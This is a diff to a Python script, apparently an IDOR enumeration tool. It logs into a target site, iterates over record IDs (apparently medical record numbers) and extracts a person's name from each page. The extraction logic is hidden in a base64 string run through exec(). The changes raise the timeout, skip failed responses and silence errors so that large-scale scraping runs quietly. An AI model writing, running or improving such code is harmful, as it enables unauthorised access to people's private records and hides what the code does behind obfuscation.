@@ -78,14 +78,18 @@ def fetch_data(id_num):
     url = BASE_TARGET_URL + formatted_id
     
     try:
-        # Timeout 5 detik agar tidak nyangkut jika server lambat
-        res = session.get(url, timeout=5)
+        # Menaikkan timeout ke 10 detik untuk stabilitas
+        res = session.get(url, timeout=10)
+        
+        if res.status_code != 200:
+            return
+
         # Protected extraction and masking logic
         # Logic: Parse HTML, mask name (2 front, 2 back), and print success result
         exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCm5hbWFfdGFnID0gc291cC5maW5kKCdwJywgY2xhc3NfPSdzYWxlLXByaWNlIHRleHQtc3VjY2VzcycpCmlmIG5hbWFfdGFnOgogICAgbmFtYSA9IG5hbWFfdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBwcmludChmJ1tcMDMzWzkybStcMDMzWzBtXSBJRE9SIFN1Y2Nlc3M6IEZvdW5kIFJNIElEIH1mb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHtuYW1hWzoyXS51cHBlcigpfS4uLntuYW1hWy0yOl0udXBwZXIoKX0nKQ=="))
 
-    except:
-        print(f"[\033[91m!\033[0m] RM ID {formatted_id}: Not Found or Error Occurred.")
+    except Exception as e:
+        pass # Diamkan error koneksi kecil agar terminal tetap bersih
 
 def start_process(start_range, end_range):
     if login():
